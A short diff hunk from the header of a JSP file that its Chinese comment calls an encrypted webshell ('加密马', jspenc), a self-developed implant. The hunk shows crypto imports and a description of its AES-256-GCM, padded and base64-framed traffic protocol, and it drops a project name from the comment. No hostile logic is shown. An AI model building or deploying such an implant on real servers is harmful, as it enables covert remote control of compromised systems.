@@ -1,5 +1,5 @@
 <%@ page contentType="text/plain" import="java.util.*,java.io.*,java.security.SecureRandom,javax.crypto.Cipher,javax.crypto.spec.GCMParameterSpec,javax.crypto.spec.SecretKeySpec" %><%!
-// ARTEX 加密马 (jspenc) —— 自研 implant,协议与 phpenc 模板头部注释同构:
+// 加密马 (jspenc) —— 自研 implant,协议与 phpenc 模板头部注释同构:
 //   body = base64( nonce(12B) || ciphertext || tag(16B) ),仅 AES-256-GCM
 //   (javax.crypto AES/GCM/NoPadding,Java 8+ 均支持,无降级路径);
 //   明文帧 = padLen(1B) || 随机填充(0~64B) || JSON;字段值恒为 base64/hex/枚举。
